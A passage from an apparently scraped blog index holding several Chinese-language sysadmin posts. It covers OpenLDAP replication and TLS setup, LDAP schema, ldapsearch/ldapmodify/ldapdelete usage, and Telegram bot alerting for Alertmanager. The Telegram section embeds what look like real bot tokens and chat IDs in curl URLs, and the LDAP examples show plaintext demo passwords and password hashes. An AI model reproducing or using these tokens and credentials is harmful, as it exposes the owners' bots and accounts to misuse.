searchbase=\u0026quot;dc=test,dc=com\u0026quot; scope=sub schemachecking=on type=refreshAndPersist retry=\u0026quot;30 5 300 3\u0026quot; interval=00:00:05:00 olcSyncRepl: {1}rid=002 provider=ldap://10.0.0.10:389/ bindmethod=simple binddn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; credentials=111 searchbase=\u0026quot;dc=test,dc=com\u0026quot; scope=sub schemachecking=on type=refreshAndPersist retry=\u0026quot;30 5 300 3\u0026quot; interval=00:00:05:00 ... - add: olcMirrorMode olcMirrorMode: TRUE EOF Syncrepl Proxy Syncrepl Proxy 模式就是 Syncrepl ，只不过通过acl控制slave为只读模式，因为配置相同，将不重复阐述\n图：Syncrepl Proxy模式 Source：https://www.openldap.org/doc/admin24/replication.html#Syncrepl%20Proxy\n创建指定用户同步 cat \u0026lt;\u0026lt; EOF | ldapadd -x -W -H ldap://10.0.0.20 -D cn=admin,dc=cylon,dc=org dn: cn=123123,ou=group,dc=cylon,dc=org objectClass: top objectClass: posixGroup gidNumber: 10011 cn: mygroup EOF cat \u0026lt;\u0026lt; EOF | ldapadd -x -W -H ldap://10.0.0.20 -D cn=admin,dc=cylon,dc=org dn: uid=rpuser,dc=cylon,dc=org objectClass: simpleSecurityObject objectclass: account uid: rpuser description: Replication User userPassword: root1234 EOF Reference [1] replication\n[2] Chapter 7 Replication \u0026amp; Referral\n","permalink":"https://www.oomkill.com/2019/09/ch6-replication/","summary":"","title":"理解ldap配置 - OpenLDAP中的4种复制机制"},{"content":"OpenLDAP TLS/SSL 配置 对于 TLS/SSL 方向的内容不过多阐述了，这里只阐述openldap TLS/SSL 配置方向的内容\nopenldap提供了两种方式进行 TLS/SSL 认证\n自动模式：客户端通过 ldaps://hostname/ 形式的URL访问slapd，slapd默认为636端口提供 TLS 会话 主动定义：slapd标准端口389支持 TLS/SSL ，客户端通过显式配置 TLS/SSL 也可以使用 URL格式ldap://hostname/ 进行访问，需要注意的是，在同步时如果使用 ldap:// 格式URL需要指定参数 starttls=yes 或者 starttls=critical 使用 ldaps:// 则不需要指定该参数 生成自签名证书 创建CA证书\nopenssl genrsa -out cakey.key 2048 openssl req -new -x509 \\ -key cakey.key \\ -out cacert.crt \\ -days 3650 \\ -subj \u0026quot;/C=HK/ST=HK/O=TVB/OU=bigbigchannl/CN=tvb-ca\u0026quot; touch index.txt echo \u0026quot;01\u0026quot; \u0026gt; serial 生成证书请求\nopenssl genrsa -out openldap.key 2048 openssl req -new \\ -key openldap.key \\ -out openldap.csr \\ -days 3650 \\ -subj \u0026quot;/C=HK/ST=HK/O=TVB/OU=bigbigchannl/CN=10.0.0.4\u0026quot; openssl ca \\ -in openldap.csr \\ -cert cacert.crt \\ -keyfile cakey.key \\ -out openldap.crt \\ -days 3650 启用openldap TLS认证 slapd TLS 部分配置是在全局部分\n修改服务端参数 # cn=config base（全局部分） dn: cn=config changetype: modify # Security - TLS section add: olcTLSCertificateFile # cafile olcTLSCertificateFile: /certs/ldapscert.pem - add: olcTLSCertificateKeyFile # ca key olcTLSCertificateKeyFile: /certs/keys/ldapskey.pem - # 证书 olcTLSCertificateFile: \u0026quot;/etc/openldap/certs/openldap.crt\u0026quot; olcTLSCertificateKeyFile: \u0026quot;/etc/openldap/certs/openldap.key\u0026quot; - # the following directive is the default but # is explicitly included for visibility reasons add: olcTLSVerifyClient olcTLSVerifyClient: never 修改客户端参数 命令行指令相关配置 客户端时指 ladpadd，ladpsearch 相关配置文件，默认为 /etc/openldap/ldap.conf\nURI\tldap://ldap.example.com ldaps://10.0.0.4:636 #SIZELIMIT\t12 #TIMELIMIT\t15 #DEREF\tnever TLS_CACERTDIR\t/etc/openldap/certs TLS_CACERT /etc/openldap/certs/cacert.crt TLS_CERT /etc/openldap/certs/openldap.csr TLS_KEY /etc/openldap/certs/openldap.key 修改服务要监听的地址\nSLAPD_URLS=\u0026quot;ldapi:/// ldaps:///\u0026quot; 同步时相关配置 在同步时仅仅需要修改slave部分配置即可\nsyncrepl rid=000 type=RefreshandPersist provider=ldaps://ldap-master.example.com bindmethod=simple searchbase=\u0026quot;dc=example,dc=com\u0026quot; retry=\u0026quot;5 3 300 +\u0026quot; attrs=\u0026quot;*,+\u0026quot; binddn=\u0026quot;....\u0026quot; credentials=.... Troubleshooing 错误 Re: OpenLDAP/TLS main: TLS init def ctx failed: -207\nOpenLDAP/TLS main: TLS init def ctx failed: -207 how to configure tls and ldap 错误 Re: slapadd: could not parse entry (line=13)\n可能原因，上下文存在空行 错误: openssl slapd tls init def ctx failed: -1 ；证书的路径，文件名，权限是否正确\n验证证书 openssl verify -CAfile {ca.crt} {.crt}\nRE: main: TLS init def ctx failed: -1 Reference：\nChapter 15. LDAP Security\n","permalink":"https://www.oomkill.com/2019/09/ch05-openldap-ssl/","summary":"","title":"理解ldap配置 - OpenLDAP使用SSL/TLS通信安全"},{"content":"curl -XPOST https://api.telegram.org/bot977657989:AAF0QE88WhxRIdpFLOYO_9ldLun5VtpfCWw/getUpdates\rcurl -X POST \\\r-H 'Content-Type: application/json' \\\r-d '{\u0026quot;chat_id\u0026quot;: \u0026quot;850233746\u0026quot;, \u0026quot;text\u0026quot;: \u0026quot;This is a test from curl\u0026quot;, \u0026quot;disable_notification\u0026quot;: true}' \\\rhttps://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage\rcurl -X POST \\\r-H 'Content-Type: application/json' \\\r-d '{\u0026quot;chat_id\u0026quot;: \u0026quot;850233746\u0026quot;, \u0026quot;text\u0026quot;: \u0026quot;This is a test from curl\u0026quot;, \u0026quot;disable_notification\u0026quot;: true}' \\\rhttps://api.telegram.org/bot1009139816:AAGTmFsJDkH9H3E0OVoFi4GyvYp0uMctvcE/sendMessage\rhttps://api.telegram.org/bot721202655:AAG_kN1IHP93Wmnd90RRaJC-dK9tKQHddRA/sendMessage\n{\r\u0026quot;chat_id\u0026quot;: \u0026quot;-383641009\u0026quot;,\r\u0026quot;text\u0026quot;: \u0026quot;This is a test from curl\u0026quot;, \u0026quot;disable_notification\u0026quot;: true\r}\ralertmanager发送的消息类型如下：\n{\r\u0026quot;receiver\u0026quot;: \u0026quot;webhook\u0026quot;,\r\u0026quot;status\u0026quot;: \u0026quot;firing\u0026quot;,\r\u0026quot;alerts\u0026quot;: [{\r\u0026quot;status\u0026quot;: \u0026quot;firing\u0026quot;,\r\u0026quot;labels\u0026quot;: {\r\u0026quot;alertname\u0026quot;: \u0026quot;InstanceDown\u0026quot;,\r\u0026quot;instance\u0026quot;: \u0026quot;192.168.8.32:9110\u0026quot;,\r\u0026quot;job\u0026quot;: \u0026quot;node\u0026quot;,\r\u0026quot;role\u0026quot;: \u0026quot;api\u0026quot;,\r\u0026quot;service\u0026quot;: \u0026quot;node\u0026quot;\r},\r\u0026quot;annotations\u0026quot;: {\r\u0026quot;description\u0026quot;: \u0026quot;192.168.8.32:9110: job node has been down vlaue==0\u0026quot;,\r\u0026quot;summary\u0026quot;: \u0026quot;192.168.8.32:9110: has been down\u0026quot;\r},\r\u0026quot;startsAt\u0026quot;: \u0026quot;2019-07-25T21:55:13.352482605+08:00\u0026quot;,\r\u0026quot;endsAt\u0026quot;: \u0026quot;0001-01-01T00:00:00Z\u0026quot;,\r\u0026quot;generatorURL\u0026quot;: \u0026quot;http://zy-tw-tianxia-prod-prometheus01:19090/graph?g0.expr=up+%3D%3D+0\\u0026g0.tab=1\u0026quot;\r}, {\r\u0026quot;status\u0026quot;: \u0026quot;firing\u0026quot;,\r\u0026quot;labels\u0026quot;: {\r\u0026quot;alertname\u0026quot;: \u0026quot;InstanceDown\u0026quot;,\r\u0026quot;instance\u0026quot;: \u0026quot;192.168.8.34:9110\u0026quot;,\r\u0026quot;job\u0026quot;: \u0026quot;node\u0026quot;,\r\u0026quot;role\u0026quot;: \u0026quot;api\u0026quot;,\r\u0026quot;service\u0026quot;: \u0026quot;node\u0026quot;\r},\r\u0026quot;annotations\u0026quot;: {\r\u0026quot;description\u0026quot;: \u0026quot;192.168.8.34:9110: job node has been down vlaue==0\u0026quot;,\r\u0026quot;summary\u0026quot;: \u0026quot;192.168.8.34:9110: has been down\u0026quot;\r},\r\u0026quot;startsAt\u0026quot;: \u0026quot;2019-07-25T21:53:13.352482605+08:00\u0026quot;,\r\u0026quot;endsAt\u0026quot;: \u0026quot;0001-01-01T00:00:00Z\u0026quot;,\r\u0026quot;generatorURL\u0026quot;: \u0026quot;http://zy-tw-tianxia-prod-prometheus01:19090/graph?g0.expr=up+%3D%3D+0\\u0026g0.tab=1\u0026quot;\r}],\r\u0026quot;groupLabels\u0026quot;: {\r\u0026quot;alertname\u0026quot;: \u0026quot;InstanceDown\u0026quot;\r},\r\u0026quot;commonLabels\u0026quot;: {\r\u0026quot;alertname\u0026quot;: \u0026quot;InstanceDown\u0026quot;,\r\u0026quot;job\u0026quot;: \u0026quot;node\u0026quot;,\r\u0026quot;role\u0026quot;: \u0026quot;api\u0026quot;,\r\u0026quot;service\u0026quot;: \u0026quot;node\u0026quot;\r},\r\u0026quot;commonAnnotations\u0026quot;: {},\r\u0026quot;externalURL\u0026quot;: \u0026quot;http://zy-tw-tianxia-prod-prometheus01:9093\u0026quot;,\r\u0026quot;version\u0026quot;: \u0026quot;4\u0026quot;,\r\u0026quot;groupKey\u0026quot;: \u0026quot;{}:{alertname=\\\u0026quot;InstanceDown\\\u0026quot;}\u0026quot;\r}\rhttps://www.qikqiak.com/post/prometheus-operator-custom-alert/\ntelegram在文本消息中插入换行符 尝试\u0026rsquo;％0D\u0026rsquo;或\u0026rsquo;％0A\u0026rsquo; 参考地址：https://stackoverrun.com/cn/q/8787508\ntelegram api 使用\nhttps://stackoverrun.com/cn/q/8787508\n","permalink":"https://www.oomkill.com/2019/09/telegram-bot-send-post-json/","summary":"","title":"telegram接收altermanager消息"},{"content":"什么是schema schema又称为数据模型，是openldap中用于来指定一个条目所包含的对象类(objectClass)以及每个对象类所包含的属性值(attribute)，其中属性值又包含必要属性和可选属性。\nNotes：拥有schema的数据代表该数据是结构化数据，无论他是什么格式，甚至于是一个连续的字符串\n如何理解schema 不管是在学习OpenLDAP时还是学习数据库时，都会遇到一个很迷糊的Schema的概念。\n在数据库中，对数据库的设计可以称之为schema。即schema约束了数据库的设计结构，并提供了整个数据库的描述。schema仅展示数据库的设计，如表字段的类型，表与表之间的关联。\n在ldap中schema与database中的schema一样，如列出的schema中，这些代表了对应的ldap结构的设计。\nwhat-is-a-schema\nschema overview\nolcObjectClasses: ( 0.9.2342.19200300.100.4.19 NAME 'simpleSecurityObject'\rDESC 'RFC1274: simple security object'\rSUP top AUXILIARY\rMUST userPassword ) # 必须包含的属性\r#\r# RFC 1274 + RFC 2247\rolcAttributeTypes: ( 0.9.2342.19200300.100.1.25\rNAME ( 'dc' 'domainComponent' ) # 表示属性名称\rDESC 'RFC1274/2247: domain component'\rEQUALITY caseIgnoreIA5Match # 相等性匹配\rSUBSTR caseIgnoreIA5SubstringsMatch # 字符串匹配\rSYNTAX 1.3.6.1.4.1.1466.115.121.1.26 SINGLE-VALUE ) # 表示数据类型\rschema包含什么 在openldap的schema中，有四个重要的元素：\nObjectclass：Objectclass定义了一个类别，这个类别会被不同的目录（在LDAP中就是一个Entry）用到，它说明了该目录应该有哪些属性，哪些属性是必须的，哪些又是可选的。一个objectclass的定义包括名称（NAME），说明（DESC），类型（STRUCTURAL或AUXILARY），表示是结构型的还是辅助型的），必须属性（MUST），可选属性（MAY）等信息。\nAttribute：Attribute就是一个上面Objectclass中可能包含的属性，对其的定义包括名称，数据类型，单值还是多值以及匹配规则等。后面用具体的例子来说明。\nSyntax：syntax是LDAP中的 “语法”，其实就是LDAP中会用到的数据类型和数据约束，这个语法是遵从X.500中数据约束的定义的。其定义需要有一个ID（遵从X.500）以及说明（DESP）\nMatching Rules：是用来指定某属性的匹配规则，实际上就是定义一个特殊的Syntax的别名，让LDAP服务器可以识别，并对定义的属性进行匹配。\nSchema Files OpenLDAP随附了一些schema，在/usr/local/etc/openldap/ chema 目录中\n文件 说明 core.schema OpenLDAP core (required) cosine.schema Cosine 和 Internet X.500 inetorgperson.schema 在添加账号时,额外的objectClass. misc.schema nis.schema 网络信息服务(FYI),也是一种集中账号管理实现. openldap.schema OpenLDAP Project(experimental) dyngroup.schema 定义动态组时使用的schema,包括要使用sudo.schema时,也需要它 ppolicy.schema 需要做密码策略时,需要导入此schema sudo.schema 定义sudo规则 ","permalink":"https://www.oomkill.com/2019/09/ch4-schema/","summary":"","title":"理解ldap配置 - OpenLDAP架构与Schema设计"},{"content":"ldapsearch 查询api ldapsearch ldapsearch命令参数说明 语法\nldapsearch [options] filter [attributes]\r参数 说 明 -W 指定密码，交互式，不需要在命令上写密码 -w 指定密码，需要命令上指定密码 -H ldapapi -D 所绑定的服务器的DN，如cn=admin,dc=etiantian,dc=org -f -f: filename.ldif文件 -b -b 指定作为查询节点而不是默认的 -LLL 以LDIF格式打印响应，不带注释 -x 简单的认证 简单的搜索 最简单的在查询ldap条目的最简单方法是使用带有 “-x” 选项进行简单身份验证，并使用 “-b” 指定搜索域。\n$ ldapsearch -x -b \u0026lt;search_base\u0026gt; -H \u0026lt;ldap_host\u0026gt;\r例如向 10.0.0.3 上openldap服务查询，该命令需要服务器接受匿名身份验证，这将可以查询而无需绑定管理员帐户\n$ ldapsearch -x -b \u0026quot;dc=test,dc=com\u0026quot; -H ldap://10.0.0.3\r使用管理员账户进行搜索 使用管理员帐户进行搜索，必须使用backend配置的 RootDN 并在命令行使用 “-D” 选项 和 “-W” ，如果要使用非交互式认证，使用选项 “-w”\n$ ldapsearch -x -b \u0026lt;search_base\u0026gt; -H \u0026lt;ldap_host\u0026gt; -D \u0026lt;bind_dn\u0026gt; -W\r例如，上章在安装时配置了RootDN：“ cn=admin,dc=test,dc=com ”。如果要使用此帐户执行搜索，可以使用命令\n$ ldapsearch -x -b \u0026quot;dc=test,dc=com\u0026quot; -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -W 使用过滤器进行搜索 上述讲到的查询方法，是进行全局查询，会输出所有的条目，这样浪费了时间和资源，在大多数情况下，都希望查询以在特定的目录树中查找特定对象。而 ”过滤器“ filter 就是为了解决这个问题的。\n要使用过滤器搜索，需要在 ldapsearch 命令的末尾附加 filter 公式：\u0026lt;object_class\u0026gt;=\u0026lt;object_value\u0026gt;\n$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(object_type)=(object_value)\u0026quot; \u0026lt;optional_attributes\u0026gt;\r例如查找所有对象，可以使用过滤器 objectclass 并且值为 ”*“ ，\n$ ldapsearch -x -b \u0026lt;search_base\u0026gt; -H \u0026lt;ldap_host\u0026gt; -D \u0026lt;bind_dn\u0026gt; -W \u0026quot;objectclass=*\u0026quot;\r查找特定的用户 如果查询目录树上的所有用户账户，如上一章初始化数据时，初始化的用户账户类为 ”posixAccount“ ，可以通过 ”posixAccount“ 来缩小查询范围\nldapsearch -x -b \u0026lt;search_base\u0026gt; -H \u0026lt;ldap_host\u0026gt; -D \u0026lt;bind_dn\u0026gt; -W \u0026quot;objectclass=posixAccount\u0026quot;\r如果每个条目输出的内容多的情况下，也可以输出的属性值来进一步缩小搜索范围，例如只需要 uid 与 gidNumber\n$ ldapsearch -x -b \u0026quot;dc=test,dc=com\u0026quot; -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 \u0026quot;objectclass=posixAccount\u0026quot; uid gidNumber\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: objectclass=posixAccount\r# requesting: uid gidNumber #\r# user01, group, test.com\rdn: uid=user01,ou=group,dc=test,dc=com\ruid: user01\rgidNumber: 10001\r# cylon, group, test.com\rdn: uid=cylon,ou=group,dc=test,dc=com\ruid: cylon\rgidNumber: 10001\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 3\r# numEntries: 2\r使用运算符进行筛选搜索 ldapsearch 可以使用多个过滤器，使用多个过滤器用运算符 “AND” 进行分割，需要注意的一点是，多个过滤器必须将所有条件括在括号中，并在查询的开头加一个 “\u0026amp;” 字。\n$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(\u0026amp;(\u0026lt;condition_1\u0026gt;)(\u0026lt;condition_2\u0026gt;)...)\u0026quot;\r例如，查找具有 “objectclass=posixAccount” 与 “uid=cylon” 的条目，您将运行以下查询\n$ ldapsearch -x -b \u0026quot;dc=test,dc=com\u0026quot; -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 \u0026quot;(\u0026amp;(objectclass=posixAccount)(uid=cylon))\u0026quot;\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: (\u0026amp;(objectclass=posixAccount)(uid=cylon))\r# requesting: ALL\r#\r# cylon, group, test.com\rdn: uid=cylon,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/cylon\rloginShell: /bin/bash\ruid: cylon\rcn: cylon\ruserPassword:: e1NTSEF9MnB2RTRDNnh5OGRrbVcyYUQvZUVvY1Zhamc4QnVqV1c=\ruidNumber: 10005\rgidNumber: 10001\rsn: cylon\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 2\r# numEntries: 1\r也可以使用或运算符 ” OR “，使多个 “OR” 运算符，需要所有条件括在括号内，并使用符号 “ | ” 写在过滤条件开头。\n$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(|(\u0026lt;condition_1\u0026gt;)(\u0026lt;condition_2\u0026gt;)...)\u0026quot;\r例如，搜索 uid=user01 或者 uid=zhangsan 的用户\n$ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; '(|(uid=user01)(uid=zhangsan))'\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: (|(uid=user01)(uid=zhangsan))\r# requesting: ALL\r#\r# user01, group, test.com\rdn: uid=user01,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/user01\rloginShell: /bin/bash\ruid: user01\rcn: user01\ruidNumber: 10004\rgidNumber: 10001\ruserPassword:: e1NTSEF9aEpwSUlWeGoxcVM5ZzA1cVVsZ0crbzdNTzE0RVhiRlE=\rsn: user01\rgivenName: user01\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 2\r# numEntries: 1\r也可以使用 “非” 运算符 ” ! “，使多个 “!” 运算符，需要所有条件括在括号内，并使用符号 “ ! ” 写在过滤条件开头。\n$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(!(\u0026lt;condition_1\u0026gt;)(\u0026lt;condition_2\u0026gt;)...)\u0026quot;\r例如，匹配 uid 不为 zhangsan 的用户\n$ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; '(!(uid=zhangsan))'\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: (!(uid=user01))\r# requesting: ALL\r#\r# test.com\rdn: dc=test,dc=com\robjectClass: top\robjectClass: organizationalUnit\robjectClass: extensibleObject\rdescription: US Organization\rou: people\rdc: test\r# group, test.com\rdn: ou=group,dc=test,dc=com\robjectClass: organizationalUnit\rou: group\r# tech, group, test.com\rdn: cn=tech,ou=group,dc=test,dc=com\robjectClass: posixGroup\rgidNumber: 10001\rcn: tech\rmemberUid: user01\rmemberUid: cylon\r# cylon, group, test.com\rdn: uid=cylon,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/cylon\rloginShell: /bin/bash\ruid: cylon\rcn: cylon\ruserPassword:: e1NTSEF9MnB2RTRDNnh5OGRrbVcyYUQvZUVvY1Zhamc4QnVqV1c=\ruidNumber: 10005\rgidNumber: 10001\rsn: cylon\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 5\r# numEntries: 4\r使用多个过滤条件 多个过滤条件可以使用 () 括起来所有的过滤条件\n$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(|(\u0026lt;condition_1\u0026gt;)(\u0026lt;condition_2\u0026gt;)...)\u0026quot;\r使用通配符进行搜索 除了运算符，还有一种高校过滤器就是通配符 “*” 这使得 ldapsearch 过滤器拥有一些正则表达式功能\n使用通配符，只需要对应的查询条件字符串结尾或开头加上 “*” 即可\n$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(object_type)=*(object_value)\u0026quot;\r$ ldapsearch \u0026lt;previous_options\u0026gt; \u0026quot;(object_type)=(object_value)*\u0026quot;\r例如查询 uid 以 “c” 开头的用户\n$ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; '(uid=c*)'\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: (uid=c*)\r# requesting: ALL\r#\r# cylon, group, test.com\rdn: uid=cylon,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/cylon\rloginShell: /bin/bash\ruid: cylon\rcn: cylon\ruserPassword:: e1NTSEF9MnB2RTRDNnh5OGRrbVcyYUQvZUVvY1Zhamc4QnVqV1c=\ruidNumber: 10005\rgidNumber: 10001\rsn: cylon\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 2\r# numEntries: 1\r扩展过滤器 可以由符合 “ : ”隔的其他过滤器，例如区分大小写与不区分大小写\nCaseIgnoreMatch 不区分大小写 cn:caseExactMatch 区分大小写 $ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; \u0026quot;cn:CaseIgnoreMatch:=USER01\u0026quot;\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: cn:CaseIgnoreMatch:=USER01\r# requesting: ALL\r#\r# user01, group, test.com\rdn: uid=user01,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/user01\rloginShell: /bin/bash\ruid: user01\rcn: user01\ruidNumber: 10004\rgidNumber: 10001\ruserPassword:: e1NTSEF9aEpwSUlWeGoxcVM5ZzA1cVVsZ0crbzdNTzE0RVhiRlE=\rsn: user01\rgivenName: user01\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 2\r# numEntries: 1\r例如类似值搜索\n$ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; \u0026quot;givenName~=usr01\u0026quot;\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: givenName~=usr011\r# requesting: ALL\r#\r# user01, group, test.com\rdn: uid=user01,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/user01\rloginShell: /bin/bash\ruid: user01\rcn: user01\ruidNumber: 10004\rgidNumber: 10001\ruserPassword:: e1NTSEF9aEpwSUlWeGoxcVM5ZzA1cVVsZ0crbzdNTzE0RVhiRlE=\rsn: user01\rgivenName: user01\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 2\r# numEntries: 1\r查找openldap服务配置 ldapsearch 命令有一种高级用法是查询 slapd 服务的配置。要进行这种搜索，必须使用选项 “-Y” 并指定 关键字 “EXTERNAL” 作为身份验证机制。\n$ ldapsearch -Y EXTERNAL -H ldapi:/// -b cn=config 例如\n$ ldapsearch -Y EXTERNAL -H ldapi:/// -b cn=config\rSASL/EXTERNAL authentication started\rSASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth\rSASL SSF: 0\r# extended LDIF\r#\r# LDAPv3\r# base \u0026lt;cn=config\u0026gt; with scope subtree\r# filter: (objectclass=*)\r# requesting: ALL\r#\r# config\rdn: cn=config\robjectClass: olcGlobal\rcn: config\rolcArgsFile: /var/run/openldap/slapd.args\rolcDisallows: bind_anon\rolcLogLevel: stats\rolcPidFile: /var/run/openldap/slapd.pid\rolcTLSCACertificatePath: /etc/openldap/certs\rolcTLSCertificateFile: \u0026quot;OpenLDAP Server\u0026quot;\rolcTLSCertificateKeyFile: /etc/openldap/certs/password\r# schema, config\rdn: cn=schema,cn=config\robjectClass: olcSchemaConfig\rcn: schema\rolcObjectIdentifier: OLcfg 1.3.6.1.4.1.4203.1.12.2\r...\r# {1}collective, schema, config\rdn: cn={1}collective,cn=schema,cn=config\robjectClass: olcSchemaConfig\rcn: {1}collective\r...\r# {-1}frontend, config\rdn: olcDatabase={-1}frontend,cn=config\robjectClass: olcDatabaseConfig\robjectClass: olcFrontendConfig\rolcDatabase: {-1}frontend\r# {0}config, config\rdn: olcDatabase={0}config,cn=config\robjectClass: olcDatabaseConfig\rolcDatabase: {0}config\rolcAccess: {0}to attrs=userPassword,shadowLastChange by dn.children=\u0026quot;cn=admi\rn,dc=test,dc=com\u0026quot; write by anonymous auth by self write by * none\rolcAccess: {1}to * by dn.base=\u0026quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external\r,cn=auth\u0026quot; manage by group.exact=\u0026quot;cn=configadmin,ou=admin,dc=seal,dc=com\u0026quot; wr\rite by * none\r# {1}monitor, config\rdn: olcDatabase={1}monitor,cn=config\robjectClass: olcDatabaseConfig\rolcDatabase: {1}monitor\rolcAccess: {0}to * by dn.base=\u0026quot;gidNumber=0+uidNumber=0,cn=peercred,cn=external\r,cn=auth\u0026quot; read by dn.base=\u0026quot;cn=Manager,dc=my-domain,dc=com\u0026quot; read by * none\r# {2}mdb, config\rdn: olcDatabase={2}mdb,cn=config\robjectClass: olcDatabaseConfig\robjectClass: olcMdbConfig\rolcDatabase: {2}mdb\rolcDbDirectory: /var/lib/ldap\rolcSuffix: dc=test,dc=com\rolcRootDN: cn=admin,dc=test,dc=com\rolcRootPW: {SSHA}xU9xFym/s7rawpmzpsYE+Q1qPsVPOwDw\rolcDbCheckpoint: 1024 10\rolcDbIndex: objectClass eq,pres\rolcDbIndex: uid,ou,cn,mail,surname,givenname eq,pres,sub\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 20\r# numEntries: 19\rNotes：这种查询命令需要直接在slapd服务对应节点上运行。\n这类搜索也可以使用过滤器，例如指定搜索数据库的配置\n$ ldapsearch -Y EXTERNAL -H ldapi:/// -b cn=config \u0026quot;(objectclass=olcDatabaseConfig)\u0026quot;\r更新API ldapmodify ldapmodify 有两个参数来指定如何修改数据：\nreplace 要修改的字段 changetype: modify 模式为修改模式 dn 对那个条目进行搜索，RootDN的后缀，对于每个条目例如，user 为 uid=\u0026lt;\u0026gt;,ou=\u0026lt;\u0026gt;,dc=test,dc=com 例如下面命令是将 cylon用户的uid更改为10010\n$ cat \u0026lt;\u0026lt; EOF | ldapmodify -r -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=cylon,ou=Group,dc=test,dc=com\rchangetype: modify\rreplace: uidNumber\ruidNumber: 10010\rEOF\r删除API ldapdelete 删除API与更新API类似，不过内容只需要一个 dn （这个dn是隐式的，不用单独声明字段），例如删除用户cylon\ncat \u0026lt;\u0026lt; EOF | ldapdelete -r -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\ruid=cylon,ou=Group,dc=test,dc=com\rEOF\r使用 ldapmodify 删除条目，只要吧 changetype: delete 在加上显式声明的 dn 也可以删除条目，例如\n$ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; uid=cylon # extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; with scope subtree\r# filter: uid=cylon\r# requesting: ALL\r#\r# cylon, group, test.com\rdn: uid=cylon,ou=group,dc=test,dc=com\robjectClass: posixAccount\robjectClass: inetOrgPerson\robjectClass: organizationalPerson\robjectClass: person\rhomeDirectory: /home/cylon\rloginShell: /bin/bash\ruid: cylon\rcn: cylon\ruserPassword:: e1NTSEF9MnB2RTRDNnh5OGRrbVcyYUQvZUVvY1Zhamc4QnVqV1c=\ruidNumber: 10005\rgidNumber: 10001\rsn: cylon\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 2\r# numEntries: 1\r$ cat \u0026lt;\u0026lt; EOF | ldapmodify -r -H ldap://10.0.0.3 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111\rdn: uid=cylon,ou=Group,dc=test,dc=com\rchangetype: delete\rEOF\rdeleting entry \u0026quot;uid=cylon,ou=Group,dc=test,dc=com\u0026quot;\r$ ldapsearch -x -H ldap://10.0.0.3 -w 111 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -b \u0026quot;dc=test,dc=com\u0026quot; uid=cylon # extended LDIF\r#\r# LDAPv3\r# base \u0026lt;dc=test,dc=com\u0026gt; 